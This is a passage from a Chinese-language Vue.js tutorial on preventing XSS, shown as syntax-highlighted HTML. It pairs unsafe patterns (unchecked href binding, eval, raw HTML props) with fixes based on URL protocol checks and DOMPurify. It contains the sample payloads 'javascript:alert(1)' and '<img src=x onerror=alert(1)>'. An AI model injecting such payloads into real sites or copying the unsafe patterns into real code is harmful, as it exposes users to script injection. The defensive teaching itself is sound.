<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :href</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;isValidUrl(userUrl) ? userUrl : &#39;#&#39;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;点击&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userUrl: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;javascript:alert(1)&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  methods: {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    isValidUrl</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">url</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">      try</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> parsed</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> URL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(url);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">].</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">includes</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(parsed.protocol);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">catch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>3. 动态执行代码</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  methods: {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    // 危险！</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    executeCode</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">code</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      eval</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(code); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 不安全</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">      new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(code)(); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 不安全</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  methods: {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    // 使用安全的方式</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    executeCode</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">code</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      // 避免使用 eval 和 Function</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      // 使用预定义的安全函数</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>4. 动态组件和 props</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- 危险：接收未验证的 HTML 作为 prop --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">component</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :is</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;componentName&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :html-content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;userHtml&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- 清理后再传递 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">component</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :is</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;componentName&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :html-content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sanitizedHtml&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      componentName: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;my-component&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userHtml: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  computed: {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    sanitizedHtml</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">      return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.userHtml);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>5. Vue Router 动态路由</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;User ID: {{ $route.params.id }}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><ul><li>Vue 会自动转义路由参数</li><li>安全</li></ul><p><strong>完整的 XSS 防护方案：</strong></p><p><strong>1. 安装安全依赖</strong></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">npm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dompurify</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sanitize-html</span></span></code></pre></div><p><strong>2. 创建安全的 HTML 组件</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> v-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sanitizedHtml&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  name: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;SafeHtml&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  props: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    html: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      type: String,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      required: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    allowedTags: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      type: Array,</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: () </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;p&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;b&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;i&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;em&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;strong&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;ul&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;ol&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;li&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;a&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  computed: {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    sanitizedHtml</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setConfig</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        ALLOWED_TAGS: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.allowedTags,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        KEEP_CONTENT: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      });</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">      return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 使用 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">safe-html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&lt;p&gt;Hello &lt;b&gt;World&lt;/b&gt;&lt;/p&gt;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span></code></pre></div><p><strong>3. URL 验证工具</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// utils/urlValidator.js</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> isValidUrl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">url</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  try</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> parsed</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> URL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(url);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">].</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">includes</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(parsed.protocol);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">catch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
